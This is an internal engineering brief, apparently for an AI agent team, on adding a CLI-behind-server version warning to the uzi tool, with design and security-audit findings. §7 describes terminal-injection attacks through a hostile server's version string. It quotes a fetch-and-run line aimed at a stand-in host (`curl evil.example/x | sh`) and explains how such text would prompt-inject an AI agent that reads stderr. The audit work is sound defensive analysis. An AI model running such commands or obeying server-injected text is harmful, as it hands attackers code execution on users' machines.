# Task brief — issue #144 item 1: warn when the CLI is behind the server

**Worktree**: `/home/user/repos/myorg/uzi/fix-144-cli-skew`
**Branch**: `fix/144-cli-version-skew`
**Tip when this brief was written**: `2d60c573d9b554618784f99058a8be2a8b986649` (== `main`).
Take the live tip if it has moved past this, and say so rather than guessing.

> **DURABILITY + SWEEP CAVEAT.** This file lives under `.claude/agent-team-tasks/`,
> which is **`.gitignore:52`**. It is **force-added and committed** on this branch, so
> it is durable and survives the worktree — but that makes it *tracked and
> simultaneously invisible to every recursive grep*. `grep -r` will NOT find strings in
> it (ugrep honours ignore files), and **`--hidden` changes nothing** — the path is
> *ignored*, not hidden, which is the wrong axis. Plain `git check-ignore` on it is
> **fail-open** (rc=1, no output); `git check-ignore -v --no-index` names `.gitignore:52`
> at once.
>
> **Any later sweep over this file must use `git grep`**, which reads the index and
> finds it by construction. See `CLAUDE.md`'s entry on this exact trap — it was measured
> on `.claude/agent-team-tasks/prd-103-m2.md`, the spec of the milestone that found it.

---

## Roster

One line per role in `.claude/agents/`. Dispatched with a SHA, or closed with a reason.
Kept current as the run proceeds — this is the durable half of the Step 2 sweep.

| role | disposition |
|---|---|
| architect | **dispatched** at `2d60c573` — design wave |
| reviewer | **dispatched** at `2d60c573` — design-critique wave (citation pass) |
| auditor | **dispatched** at `2d60c573` — design-critique wave (citation pass) |
| coder | pending — spawns against the FROZEN brief after the design wave settles |
| tester | pending — dispatch after the coder's FIRST commit, never at kickoff |
| spec-keeper | pending — `specs/` exists and this adds a CLI behaviour + an env var, so `specs/ai.md` owes an entry. After blocking findings resolve. |
| documenter | pending — `CHANGELOG.md` owes a one-line entry |
| fact-checker | pending — decide after the design wave; its citation ask may already cover the brief's claims |
| release | **closed** — this run ends at an MR. No tag, no release cut. |
| researcher | **closed** — the investigation is already done and written up in §1; there is no open question needing research. |
| web-ux | **closed** — no web surface touched. The web half of this bug was already correct (`RunCredential` rendered both tokens right); the defect is entirely CLI-side. |

---

## 1. What happened, measured 2026-08-03

The user asked why two concurrent uzi runs looked like they were on different
Anthropic tokens while the UI showed the same one. Ground truth, from
`GET /api/runs/<id>` against `https://uzi.example.com` (API `0.14.0`,
commit `2d60c573`):

| run | issue | claimed | `anthropic_secret_label` | `anthropic_select_reason` | headroom |
|---|---|---|---|---|---|
| `edbc3884-ff8c-4f75-bd0f-3ad8833c25a7` | #209 | 12:45:37Z | `meta` | `auto` | 100 |
| `a146df98-aac6-4b59-9333-c3c6799a5bc0` | #78 | 12:30:50Z | `personal` | `default` | null |

The **web UI was correct** — it rendered `token "meta" — auto, 100% headroom`
(screenshot confirmed by the user). `RunCredential` at `web/src/pages/RunView.tsx:524`.

**The CLI was not.** `uzi run get <id> --json` on the then-installed **v0.11.8**
printed `null` for all four of `anthropic_secret_id`, `anthropic_secret_label`,
`anthropic_select_reason`, `anthropic_headroom_pct`, on **both** runs — while raw
`curl` against the identical endpoint returned the values above. After
`brew upgrade uzi-cli` (0.11.8 → 0.14.0) the same commands returned
`{"iid":209,"label":"meta","reason":"auto","headroom":100}` and
`{"iid":78,"label":"personal","reason":"default","headroom":null}`.

So a CLI three minors behind the server **silently drops fields it does not know**,
and nothing anywhere says so. That is the defect.

## 2. This is issue #144 item 1, and it is HALF-DONE

Read `env -u GITLAB_TOKEN glab issue view 144`. Item 1 asks for two things:

> Suggested: `uzi version` (and/or `uzi auth status`) reports **both** binary and
> server version, **and warns when they differ**.

- The **"reports both"** half shipped: PRD #175 M4 added `serverBuildInfo` /
  `serverRows` to `api/cmd/uzi/version.go`. `uzi version` prints the server's
  build info today.
- The **"warns when they differ"** half was never built. `version.go` fetches the
  server version and never compares it to `version`.

Scope of this task is that missing half, plus the delivery decision below.

## 3. Design already settled with the user — do not re-litigate

The user was shown three placements and chose **"every command, cached probe"**,
with this exact preview:

```
$ uzi run get <id> --json
uzi: CLI v0.11.8 is behind server 0.14.0; some
     fields may be missing. Run: brew upgrade uzi-cli
{
  "id": "edbc3884-...",
  ...
}

(warning -> stderr, JSON -> stdout, exit code unchanged)
```

Binding constraints from that choice:

1. **Warning goes to STDERR. Never stdout.** `--json` consumers parse stdout; a
   warning there corrupts every parser. This is the whole reason the option was
   presented that way.
2. **The exit code is unchanged.** A skew warning is not a failure. `ExitCodeFor`
   must see exactly what it sees today.
3. **Cached, not per-command.** A probe on every invocation is unacceptable
   latency. Cache the server's version and re-probe on a TTL (~1h was the figure
   shown to the user; the architect may argue a different one).
4. **The proposal is `brew upgrade uzi-cli`.** That is the only documented install
   path — `Formula/uzi-cli.rb` is the source of truth and release CI publishes it
   into the `vtmocanu/homebrew-tap` tap (verified this session: the tap's `main` is
   at `tag: "v0.14.0"`, CI is healthy, the local clone was merely 8 days stale).
5. **Landing**: a scoped MR against issue #144, no new PRD.

## 4. Facts you will need, each re-derivable

**The semver trap is LIVE here and it fails open.** `uzi version` prints
`v0.14.0` (leading `v`, stamped by `-ldflags -X main.version=v#{version}` in
`Formula/uzi-cli.rb:48`) while `/api/version` returns bare `0.14.0`
(`apitypes.BuildInfoDTO.Version` doc: *"bare — the Dockerfile strips a leading v"*).

**🔴 AMENDED 2026-08-03 (design wave, reviewer N10 + lead re-derivation). THE EXAMPLE
THIS PARAGRAPH ORIGINALLY CARRIED HAD THE WRONG SHAPE, AND THE RIGHT ONE IS WORSE.**
It quoted `CLAUDE.md`'s **both-bare** case, `Compare("0.11.0","0.11.7") == 0`. The live
pair is **one prefixed, one bare**. Measured against `golang.org/x/mod@v0.38.0`, twice
independently (reviewer in a throwaway module, lead re-derived in the scratchpad — all
six rows agreed):

```
Compare("v0.11.8",         "0.14.0")  =  1   IsValid true/false   <- THE LIVE PAIR
Compare("v0.11.8",         "v0.14.0") = -1   IsValid true/true    <- what a fixture "naturally" writes
Compare("0.11.0",          "0.11.7")  =  0   IsValid false/false  <- the both-bare case, wrong shape here
Compare("vdev",            "v0.14.0") = -1   IsValid false/true   <- see B1 below
Compare("v0.14.0",         "vdev")    =  1   IsValid true/false
Compare("v0.14.0+g2d60c57","v0.14.0") =  0   IsValid true/true    <- build metadata is comparison-neutral (§10)
```

**A `< 0` gate on the un-normalised live pair returns `1`, i.e. "the CLI is AHEAD", so
it is SILENT on exactly the bug §1 opens with.** The conclusion (an un-normalised
compare is silently dead) survives; the example did not support it.

**Consequence for the test fixtures, and it is the sentence that makes them
discriminate:** §5's rule *"the fixture must be genuinely BEHIND"* is necessary and
**not sufficient**. A behind-fixture written `("v0.11.8","v0.14.0")` passes against an
implementation that forgets to normalise the **server** side, because the fixture
already normalised it. **The fixture must feed the server version in its bare wire
form (`"0.14.0"`), exactly as `/api/version` serves it.**

- **In-repo precedent that gets it right**: `api/internal/forge/forgejo.go`,
  `checkForgejoVersion` — re-prefix with `v`, guard on `semver.IsValid`, then
  `semver.Compare`.
- `golang.org/x/mod v0.38.0` is **already** in `api/go.mod:22`. No new dependency.
- SemVer §10: build metadata is comparison-neutral, so `v0.14.0+g2d60c57` compares
  equal to `v0.14.0` — which is what we want, and is not the same as string equality.
- **The discriminating test fixture must be genuinely BEHIND.** `Compare(x,x)==0`
  is the right answer from a completely broken comparison, so an all-equal fixture
  set certifies nothing. `.claude/agent-team.md` catalogues this exact case.

**Where the hook goes.** `api/cmd/uzi/root.go` already has the seam:

```go
root.PersistentPreRun = func(cmd *cobra.Command, _ []string) {
    if env.AutoUpgradeSkill && !underSkillCmd(cmd) {
        maybeAutoUpgradeSkill(env)
    }
}
```

`underSkillCmd` (`api/cmd/uzi/skill.go:191`) walks ancestors looking for `skill`.
`maybeAutoUpgradeSkill` (`:204`) is the tone to match: **never fatal, never
blocking**, honours `UZI_SKILL_AUTO_UPGRADE=0`, warns on stderr and returns.

**Where the cache goes.** `uzicli.Store` (`api/internal/uzicli/config.go`) is
rooted at `~/.config/uzi`, **hardcoded and deliberately not XDG** — that file
carries a comment explaining why (on this team `XDG_CONFIG_HOME` points into a
git-tracked mackup repo). Do not add an XDG lookup. `Store.Dir()` is exported.
`env.Store` may be **nil** (no home dir) and every caller tolerates that.

**How the probe should behave.** `serverBuildInfo` in `api/cmd/uzi/version.go` is
the model and its doc comment states the contract: every failure returns nil, the
no-URL case is checked **before** a client is built so the common standalone
invocation makes no network call at all, and `serverProbeTimeout = 2 * time.Second`
exists specifically because `uzi version` runs inside Homebrew's sandboxed
`test do` with no server anywhere — a 30s stall there is a failed release.

**Two gates in `api/cmd/uzi/` that will bite you:**

- `instructions_test.go` — the printed-instruction registry (PRD #98 seam 5). It
  lifts every `uzi …` span out of printed strings via AST and demands a registry
  entry; a RUNTIME instruction's entry is *a claim that the instruction has been
  executed*, and `kindUnknown` **fails**. Read the file's header before you print
  anything. Note the proposed message says `brew upgrade uzi-cli`, not `uzi …` —
  confirm for yourself whether that is in or out of the extractor's scope rather
  than assuming.
- `skill_drift_test.go` — asserts the embedded `SKILL.md` matches the real cobra
  tree. The skill ships **inside** the binary
  (`api/internal/uzicli/skill.go`, `//go:embed skill/SKILL.md`), so CLI↔skill skew
  is structurally impossible; only CLI↔server skew is real. If a new env var is
  added it belongs in `api/internal/uzicli/skill/SKILL.md`'s configuration section
  next to `UZI_SKILL_AUTO_UPGRADE=0`.

**`brew-local-test.sh` constrains stdout, not stderr.** `scripts/brew-local-test.sh`
matches `case "$out" in "v$version"*)` anchored at the start of the **whole**
stdout, which is why `version.go` prints the CLI version first and alone on line
one. A stderr warning does not touch this; a stdout one breaks the release.

## 5. Gate

Run `task gate:api` (fmt-check + vet + build + lint + deadcode + test). Do not
restate its recipe. The lint slot is ratcheted against `origin/main` — if
`origin/main` does not resolve, `git fetch origin main` rather than starting a
burn-down.

`test:api` carries `-race -count=1`. Live-DB tests are not in scope here.

---

## 6. Design-wave findings — AMENDMENT 1, 2026-08-03

Round 1 of the design-critique wave. **Reviewer reported; architect and auditor are
still in flight, so this section is OPEN and will gain an Amendment 2 before the brief
freezes.** The coder is not spawned until it does.

Reviewer's citation pass came back **10 of 10 CONFIRMED** — no claim in §4 was refuted,
and `underSkillCmd:191` / `maybeAutoUpgradeSkill:204` are exact. Three findings are
blocking on the DESIGN.

### B1 — 🔴 THE NAMED PRECEDENT INVERTS THE SAFE DIRECTION, AND THE DEFAULT CLI VERSION IS UNPARSEABLE

`api/cmd/uzi/root.go:16` is `var version = "dev"`. Measured (above): an **invalid**
version sorts BELOW a valid one, so `Compare("vdev","v0.14.0") = -1`.

**The natural rule — warn when `Compare(cli, srv) < 0` — warns on every binary built
with `go build ./cmd/uzi`.** That is every developer running from source, every
`runCLI` test, and the coder's own gate runs, each told to `brew upgrade uzi-cli`.

§4 points at `checkForgejoVersion` as the precedent, and **copying it literally is what
produces the bug**. Forgejo *refuses* on unparseable (`forgejo.go:178-180`), and its own
doc argues refusing is the safer failure mode — true there, because it is a feature gate
at connect time. Here "refuse" maps to "warn", which is the **wrong direction**: a
build-info probe that cannot be parsed must be **SILENT**.

**Binding:** re-prefix BOTH sides, require `semver.IsValid` on BOTH, and state in code
that a failed validity check is silence. The precedent is the *shape* (re-prefix →
IsValid → Compare), not the disposition.

### B2 — 🔴 CACHING ONLY SUCCESSES VIOLATES BINDING CONSTRAINT 3

§3.3 forbids a per-invocation probe. But "cache the server's version" leaves **nothing
to store when the probe fails**, and `serverBuildInfo` returns `nil` for every failure
(`version.go:93/97/107`) without distinguishing "no URL" from "connection refused".

So a user with `UZI_URL` set and the server unreachable — VPN off, offline, compose
stack down, dev cluster restarting — takes a **cache miss on every invocation** and pays
`serverProbeTimeout` (2s) before every command. That is the per-invocation probe
constraint 3 forbids, and it is strictly worse than today, where `serverBuildInfo` is
reached only by an explicit `uzi version`.

**Binding:** the cache must hold a NEGATIVE observation (probe failed at T) with its own
TTL.

### B3 — 🔴 KEY THE CACHE ON THE RESOLVED URL

`resolveSettings` (`root.go:155-174`) lets the URL change per invocation: `--url` beats
`$UZI_URL` beats the config file. An unkeyed cache applies server A's version to server
B — and the warning is a *factual claim about the server you are talking to*. Prod plus
the dev cluster is the normal shape here (`CLAUDE.md`: "we mostly test in k8s now"), not
a corner case.

**Binding:** key on the resolved URL, or store `url → {version, checked_at}`.

### Non-blocking, carried into the implementation

- **N1** Cache the OBSERVATION, never the VERDICT. A cached `skew: true` is not cleared
  by `brew upgrade uzi-cli`, so the user is told to upgrade for up to a TTL *after they
  did*. Storing `{url, server_version, checked_at}` and recomputing against `version`
  each run self-heals, because the CLI side is what changed. Write the reason down or
  someone "optimises" it into a boolean.
- **N2** Put the cache in `uzicli` beside `Store`, not in `main` via `Dir()`:
  `writeFileAtomic` (`config.go:187`) and the 0700 `MkdirAll` discipline are
  **unexported**. Agents run uzi in parallel, so the atomic rename is wanted.
- **N3** "Every command" is not what the seam delivers. Measured against cobra v1.10.2:
  `--help` (`:934`), `--version` (`:945`), a non-runnable command (`:956`) and a failed
  `ValidateArgs` (`:970`) all return **before** the PersistentPreRun loop (`:982`). So
  **`uzi --version` never warns while `uzi version` does.** Decide it deliberately.
- **N4** The seam is single-occupancy: cobra `break`s at the first ancestor with a
  `PersistentPreRun` and `EnableTraverseRunHooks` is unset. This MR makes it a
  two-consumer seam; a future subcommand adding its own hook silently disables BOTH with
  nothing failing. One comment at `root.go:109` closes it.
- **N5** `--quiet` is undecided and the precedent does not answer it —
  `maybeAutoUpgradeSkill` takes no `gf` and ignores it, while 20 other sites honour it.
  `gf.quiet` IS reachable at the hook. Lead's call: **`--quiet` suppresses the warning**
  (it is non-essential output by definition). Implement that.
- **N6** Gate the hook on an `Env` field, true in `DefaultEnv`, false in `fakeEnv` —
  mirroring `AutoUpgradeSkill`. Otherwise every existing command test starts calling
  `FakeClient.BuildInfo`.
- **N7** `e2e/run-e2e.sh:1682`'s `uzi_cli()` sets `UZI_URL`, so the hook probes there.
  The new opt-out env var belongs on that line **in this MR**, beside the existing
  `UZI_SKILL_AUTO_UPGRADE=0`, which sits there for exactly this class of side effect.
  Note the printed-instruction rows assert exact counts over stdout AND stderr
  (`:3293-3296`, `:3355-3360`).
- **N8** `uzi version` would probe twice (`version.go:57` already calls
  `serverBuildInfo`). Exempt it from the hook, or share the cache.
- **N9** The probe carries the bearer token (`client.go:97-112`, gated by
  `credentialSafeBase`). No new exposure class, but it moves credential traffic from
  "once per explicit `uzi version`" to "once per TTL per command stream". Flagged for
  the auditor.
- **N11** A new env var owes **`docs/cli.md`** (which documents `UZI_SKILL_AUTO_UPGRADE`
  at `:547`) as well as `SKILL.md:327`. `skill_drift_test.go` extracts only `--flags`
  and command paths — **env vars are gated by nothing in either direction**, so both
  files are by hand.
- **N12** State the TTL's failure direction: with an observation cache, staleness means
  **server upgraded → no warning for up to a TTL**. Silence-when-you-should-warn, never
  a false warning. That is the argument for 1h; record it so the next reader can tell it
  was reasoned.
- **n1** The proposed message escapes the printed-instruction extractor for a reason one
  character wide, twice: `instructionRE` needs `uzi ` with a SPACE, and the message has
  `uzi:` (colon) and `uzi-cli` (hyphen). Measured, not read. **Rewording it to mention
  `uzi version` re-arms a kindRuntime registry entry** requiring execution evidence.

---

## 7. Design-wave findings — AMENDMENT 2, 2026-08-03 (auditor)

Executed attacks against a scratch build driven at a hostile loopback `/api/version`,
under `env -i` with a fake HOME. Not theory. Architect still in flight; §8 will close.

### 🔴 H1 (HIGH) — THE SINK ALREADY EXISTS ON `main` AND IS ALREADY UNSAFE. THIS DESIGN MULTIPLIES IT.

`version.go:118` puts `b.Version` into a row verbatim; `:74` prints it with `fmt.Fprintf`.
No sanitizer, no cap. Four attacks, all exit 0, all confirmed by `od -c` of real stdout:
`ESC[2J ESC[H` (erase display), **`\r` line-overwrite**, `OSC 8` hyperlink, `U+202E` bidi.

The `\r` one is the sharpest: the rendered line reads **only**
``WARNING: run `curl evil.example/x | sh` to fix`` — uzi's own `server version ` prefix is
erased, so an arbitrary attacker sentence appears to come from uzi.

**The repo already decided this exact class, the strict way.** `run.go:1152-1153` sanitizes
`RateLimitType` **even though the server allowlists it to an enum**, with the comment
*"server-controlled today is exactly the assumption that rots"*. `BuildInfoDTO.Version` has
**no** server-side constraint (`handler.go:399` passes `h.version` straight through —
contrast `Commit`, gated by `isFullSHA`, and `BuiltAt`, gated by `time.Parse`). So Version
is strictly weaker than the field the repo already ruled must be sanitized.

**Why it escalates here, and the AI-specific lens:** today the blast radius is one command
run deliberately. Under a `PersistentPreRun` hook it becomes every invocation of every
command, **on stderr** — and the bundled skill tells agents `read stderr`
(`SKILL.md:43`). A hostile or compromised server therefore lands attacker-authored text
in an agent's context on every uzi call. That is prompt injection through a version
warning.

**`--json` is not a shield**: Go's `json.Marshal` escapes C0 controls but does NOT escape
U+202E; raw bidi rides stdout in JSON mode.

**Precondition:** the attacker controls the endpoint (compromised deployment, or a user or
agent induced to use `--url`/`$UZI_URL`). `credentialSafeBase` forces https off-loopback,
so passive MITM is not a route.

**BINDING — `cellText` (`run.go:950`) every `BuildInfoDTO` string that reaches the warning,
AT PRINT TIME, after the cache read.** Not at fetch, not at cache-write — see H4(c).

### H2 (MEDIUM) — UNBOUNDED. Measured: a 1 MiB version string prints in full, one line, exit 0
`maxRespBytes = 32 << 20` (`client.go:232`) is the only ceiling. Under this design that
lands on stderr of every command AND in the cache file, and is re-read for the whole TTL.
`cellText`'s **200-char cap** fixes H1 and H2 in one edit — which is the argument for
reusing it rather than hand-rolling a control stripper.

### H3 (MEDIUM) — THE ROUTE IS UNAUTHENTICATED; THE REQUEST IS NOT
Verified by execution with a canary token, not by reading. The route is genuinely
unauthenticated (`handler.go:446`, outside `RequireAuth`, `noLimiter`). **The request
carries `Authorization: Bearer uzc_…`.**

So these commands, which make **no network call today**, would start shipping the user's
token on every invocation:
- **`uzi logout`** (`login.go:179-199` — `env.Store` only) — ships the token to the server
  on the way to deleting it.
- **`uzi auth token`** (`auth.go:31-49` — reads a credential from stdin, no client) — a
  command built so *"a credential must never land on argv"* would emit a request carrying
  the **previous** credential.

**§4's model breaks here:** `maybeAutoUpgradeSkill` is a purely LOCAL filesystem operation.
The probe would be the first network call in `PersistentPreRun`, so "match its tone"
transfers the failure-handling shape but **not** the risk profile.

**BINDING:** probe-exempt the local-only commands the way `underSkillCmd` exempts `skill`.
**Do NOT strip the `Authorization` header to make the probe truly unauthenticated** — that
removes the stated justification for `credentialSafeBase` on this path and re-opens
`uzi … --url http://…` as a token leak.

### H4 (MEDIUM) — CACHE KEYING, and one sub-finding is a NEW credential-write path
- **(a) Unkeyed = cross-endpoint poisoning.** One `--url https://hostile` populates the
  cache; every later invocation against the real server prints the attacker's string until
  the TTL expires. (Independently the reviewer's B3.)
- **(b) Keying on the RAW URL writes credentials to a 0644 file.** `credentialSafeBase`
  does not strip userinfo. Executed: `--url 'http://alice:hunter2@127.0.0.1:…'` → exit 0,
  served. Control: after **eight** `--url` invocations the scratch home held only the
  seeded `credentials.toml` and **no `config.toml`** — a `--url` base is never persisted
  today outside `uzi login`. The cache would be the **first** write path that persists it,
  and `SaveConfig`'s precedent is **0644**. → key on a **hash** of the URL, or the context
  name. Never the raw string.
- **(c) Sanitize on READ, not on WRITE.** A write-time sanitizer is bypassed by the cache
  file itself — a plain file with no integrity protection, so anything that can write it
  controls the warning text with **no network involvement**. Treat the cache as exactly as
  untrusted as the network response.
- **Reuse `writeFileAtomic` (`config.go:186`)** — `os.CreateTemp` (0600) → `Chmod` →
  `os.Rename`, and rename replaces a symlink rather than following it. A hand-rolled
  `os.WriteFile` would follow a symlink and **would be a real vulnerability**. Do NOT copy
  `LoadCredentials`' refuse-on-wide-perms guard: the right property for a cache is
  distrust-on-read, not refuse-on-read.

### H5 (LOW) — `/api/version` has NO rate limiter (`route_limiter_mounts_test.go:203`)
Unauthenticated, unlimited, about to be called by every CLI invocation from every user and
agent. **The TTL is the load-bearing mitigation, so this grade moves if the TTL moves.**

### Ungraded mechanisms, carried
- **Silence is ambiguous.** Every error maps to nil, so "no warning" cannot distinguish
  *agree* from *the probe never ran*. Cache a negative distinctly from a positive.
  (Converges with reviewer B2 from the other direction.)
- **A cached verdict outlives its condition.** After `brew upgrade uzi-cli` the new binary
  reads the old entry and warns (or stays silent) wrongly for the rest of the TTL.
  **Include the CLI's own version in the cache entry and invalidate when it changes**, not
  only on the TTL.
- **`serverProbeTimeout = 2s` is per-REQUEST, not a per-invocation budget.** It reads like
  a total and is not. `refuseRedirect` (`client.go:272`) already blocks redirect
  amplification.

### 🔴 TOOLCHAIN CONSTRAINT discovered by the security scan — binds the implementation
The repo's security-scan slot is `none (gap, noted 2026-07-21)` (`agent-team.md:1506`), so
the auditor substituted its own tools and labelled that. `gitleaks` on `2d60c573..2ab304c3`:
clean. `govulncheck` on `./cmd/uzi/... ./internal/uzicli/...`: **two PRE-EXISTING vulns,
neither introduced here** (`GO-2026-5970` x/text infinite-loop; `GO-2026-5320` goldmark XSS).

**The x/text trace runs through `uzicli.Printer.Println` (`output.go:169`).** `version.go`
uses plain `fmt.Fprintln`/`Fprintf`, so the version path does not reach it today.
**It becomes reachable if the implementer routes the new warning through `uzicli.Printer`.**
→ **Print the warning with `fmt.Fprintf(env.Stderr, …)`. Do NOT use `Printer`.**

### Test fixture, binding (auditor item 5)
A well-formed `0.11.8` passes against a **completely unsanitized** implementation. The
discriminating inputs are `\r`, `ESC[2J`, `U+202E`, and a 1 MiB version. Include all four.

---

## 8. USER SCOPE DECISIONS — 2026-08-03, binding

Asked after Amendment 2, because the auditor's H1/H2 are **pre-existing on `main`** and
not caused by this work. Both answers widen the scope beyond the lead's recommendation;
both are the user's call and are binding.

### D1 — The terminal-injection fix lands FOLDED IN, as ONE commit

The lead recommended a separate commit in the same MR so the security fix stayed
independently cherry-pickable to a patch release. **The user chose one commit.**
Recorded consequence, stated once and not re-litigated: **the sanitizer cannot be
cherry-picked to a release branch without the feature.** Implement as a single coherent
change.

### D2 — The two pre-existing dependency vulns are bumped IN THIS MR

- `GO-2026-5970` — `golang.org/x/text` **v0.38.0 → v0.39.0** (infinite loop on invalid
  input; reachable via `uzicli/output.go:169` `Printer.Println`)
- `GO-2026-5320` — `github.com/yuin/goldmark` **v1.7.8 → v1.7.17** (XSS; reachable via
  `cmd/uzi/tui_render.go:64` → glamour → `html.Renderer`)

Neither is introduced by this branch. The lead recommended filing an issue instead;
the user chose to bump here.

**Notes for whoever does it:** goldmark is pulled through **glamour** (the TUI markdown
renderer), so the bump is not necessarily a leaf change — check whether glamour pins it
and whether the TUI render tests (`tui_render_test.go`) still pass. Re-run `govulncheck`
after the bump and paste the output; **a clean `go build` is not evidence the vuln is
gone**, and `govulncheck` exiting 3 vs 0 is the check. Both modules' gates must stay
green (`task gate:api`; `controller/` has its own `go.mod` and is not affected unless the
bump reaches it — verify rather than assume).

**Scope boundary that did NOT move:** this remains a scoped MR against issue #144. No new
PRD. Nothing else gets swept in — if the dep bump cascades into unrelated churn, stop and
report rather than widening further.

---

## 9. AMENDMENT 4 — architect's design, one conflict ruling, and the FREEZE

Full design: `.claude/agent-team-tasks/144-design.md` (architect). Its citation pass was
**8 of 8 CONFIRMED**, independently of the reviewer's 10 of 10. Read it — the eight
settled points below are the short form, not a replacement.

### 🔴 THE SEMVER DEFECT IS NOT "WRONG ON SOME PAIRS". IT IS **INERT**.

The architect measured against this project's real shipped shapes rather than inheriting
CLAUDE.md's example, and the result is stronger than anything in §4. Lead re-derived it
over a 5×5 grid of realistic pairs:

```
rows = 25   rows where Compare(cli, srv) < 0, i.e. would warn = 0
```

**Zero. `cli=v0.1.0` against `srv=99.0.0` — 98 majors behind — still returns +1.** The
CLI is always the valid operand and the server always the invalid one, so an
un-normalised `< 0` gate **can never fire, for anyone, ever**. §4 said it was silent on
the live pair; it is silent on the entire input space.

**AND THE TWO FAILURE MODES SIT AT DIFFERENT STAGES, IN OPPOSITE DIRECTIONS.** This is
the thing to get right:

| stage | implementation | behaviour |
|---|---|---|
| 0 | naive `Compare(cli, srv) < 0` | **INERT** — never warns (25/25 above) |
| 1 | re-prefix BOTH sides, no `IsValid` guard | **OVER-FIRES** — `Compare("vdev","v0.14.0") = -1`, so every `go build` binary is told to `brew upgrade` |
| 2 | re-prefix + `IsValid` on BOTH + silent on invalid | correct |

So **B1 bites the fix, not the bug.** An implementer who adds normalisation without the
guard moves from never-warns to always-warns-in-dev. A test suite that only proves
"it warns when behind" passes at stage 1.

### CONFLICT RULING — `logout` and `auth token` ARE probe-exempt

The architect and the auditor disagreed, and this is the lead settling it rather than
averaging it.

- **Architect**: *"`login`/`auth token` are not exempt (endpoint is unauth)."*
- **Auditor**: measured, with a canary token, that the **request carries
  `Authorization: Bearer uzc_…`** even though the route is unauthenticated.

They answered two different questions — *is the ROUTE authenticated?* (no) and *does the
REQUEST carry the credential?* (yes). Only the second bears on the exemption. **The
architect's own citation pass states the token is carried**, so its conclusion
contradicts its own evidence; the execution wins.

Lead re-derived both commands at `1279efd8`: `logout` (`login.go:184-200`) and
`auth token` (`auth.go:31-49`) are **pure `env.Store` operations — no `env.client`, no
network**. And `logout`'s own `Short` reads *"Remove the locally stored CLI credential
**(does not revoke it server-side)**"* — a probe there would make it contact the server,
contradicting its documented contract.

**BINDING: exempt `logout` and `auth token`.** Note the command sets differed — the
architect wrote `login`, the auditor `logout`. **`uzi login` is already on the network**
(device-auth flow) and needs no exemption; the exempt pair is `logout` + `auth token`.

### The architect's eight settled points, short form

1. **Boundary** — `api/internal/uzicli/versioncheck.go` = pure comparison + cache (no
   cobra, no I/O, **no `time.Now()`** in the library); `api/cmd/uzi/versioncheck.go` =
   hook + exemptions, reusing the **existing** `serverBuildInfo` rather than a second
   probe function.
2. **Cache** — `~/.config/uzi/version-check.json`, 0644, atomic write, keyed on a **map
   of normalised base URL**. Stores the last **attempt** (empty version = probe failed),
   and the **server's version, never the verdict**. Nil store → skip. Corrupt → miss.
   Future timestamp → not fresh. Write failure → silent.
3. **TTL 1h**, with the argument: too-long only delays hearing about a *server* upgrade;
   the CLI-upgrade direction is instant by (2).
4. **Exemptions** — `skill` subtree, `__complete`/`__completeNoDesc`, `completion`, plus
   the ruling above. **`uzi version` is RELOCATED, not exempt**: it warns inline from its
   own live probe, because `PersistentPreRun` runs *before* `RunE` and a cached warning
   would visibly contradict the `server version` line printed later in the same
   invocation. `--help`, `--version` and non-runnable parents need no exemption — cobra
   returns above the hook loop (`command.go:918-993`).
5. **Message clears the extractor with zero new registry entries** — established by
   reading `instructionRE`, matching the reviewer's independent measurement. Two rules:
   never name a `uzi <verb>` in this message, and **if a test reddens, reword — never
   register**.
6. **`UZI_VERSION_CHECK=0`**, same `== "0"` test as `UZI_SKILL_AUTO_UPGRADE`.
7. **Tests** — assert both channels explicitly; pin `--json` by asserting
   `json.Unmarshal(stdout)` **succeeds** rather than by a negative string check (this
   repo has a documented vacuous-negative case); pin the exit code **differentially**
   (same invocation, check on vs off, equal codes) on a success path *and* a 404 path,
   never hardcoded to 0. Needs a `BuildInfoCalls` counter on `FakeClient`, without which
   the no-double-probe and cache-hit claims are **unobservable**.
8. **Declined** — no `--check` flag, no `uzi upgrade`, no server-is-behind warning, no
   background probe, no `api/internal/verscmp` extraction (a third `normSemver` copy is
   accepted; extracting it would touch `forge` and `workersvc` inside an issue-scoped MR).

### Lead decisions on the architect's two open questions

Both had sensible defaults; neither needed the user.

- **One line.** The two-line hanging indent in the user-facing preview was a **mockup
  wrap, not a spec**. Every other stderr warning in this package is one line, and
  hard-wrapping is wrong at every width but one.
- **Document `UZI_VERSION_CHECK=0` in BOTH `SKILL.md` and `docs/cli.md`**, framing the
  warning as actionable. An undocumented escape hatch is worse than a documented one:
  agents can read it out of the source either way, and only the user loses by not knowing
  it exists. Note `skill_drift_test.go` gates **neither** file for env vars (reviewer
  N11) — both are by hand.

---

# 🔒 THE BRIEF IS FROZEN AS OF THIS AMENDMENT (`1279efd8` + this commit)

Design wave closed: architect, reviewer, auditor, all three citation passes clean, three
blocking design findings and one HIGH resolved into bindings above. The coder spawns
ONCE against this text.

**From here, a DESIGN change is a new wave, not a message.** A pre-flag (a finding the
coder can absorb without re-deciding anything) may still be forwarded mid-implementation.
Anything that re-decides something already built on gets an Amendment 5 and an explicit
"work in flight is invalidated".

Outstanding and NOT blocking the freeze: the fact-checker is still ruling on whether
`CLAUDE.md`'s *"EVERY VERSION THIS PROJECT SHIPS IS BARE"* is itself wrong. That is a
**doc** question about `CLAUDE.md`, not a design question — the measurements this brief
relies on are already independent of it, taken from the shipped stamps directly.

---

## 10. AMENDMENT 5 — CLAUDE.md correction, user-approved 2026-08-03

**🔴 THIS DOES NOT TOUCH THE CODER'S SCOPE AND INVALIDATES NOTHING IN FLIGHT.** It is
DOCUMENTER work, queued behind the coder's first commit so the worktree keeps exactly one
writer. The frozen design in §9 is unchanged.

### The finding

`CLAUDE.md:166` opens **"EVERY VERSION THIS PROJECT SHIPS IS BARE"**. REFUTED by the
fact-checker, re-derived by the lead. **4 of 17 stamp/declaration sites carry the `v`**:
the CLI binary (`Formula/uzi-cli.rb:48`), git release tags, the tap formula's `tag:` pin,
and `uzi version`'s own output. The `v` is **release-gated, not incidental** —
`scripts/brew-local-test.sh:73` matches `"v$version"*` and fails the release if the CLI
stamp is bare.

**It was false when written**, verified by the lead:

| | |
|---|---|
| `Formula/uzi-cli.rb` `v` stamp lands | `17c04352`, **2026-07-17** (PRD #64 M4) |
| the CLAUDE.md headline lands | `e7a0cc1f`, **2026-07-26** ("migrate two repo-general rules out of PRD #113's ephemeral design doc") |

The source is `prds/113-worker-upgrade-status.md:210`, where the sentence is **TRUE**
because PRD #113's scope is the worker fleet — api image, chart, agent image, all bare.
**The migration promoted a scope-true claim to a repo-general one without re-deriving its
scope**, and widened it explicitly with *"Not PRD-specific; any future version comparison
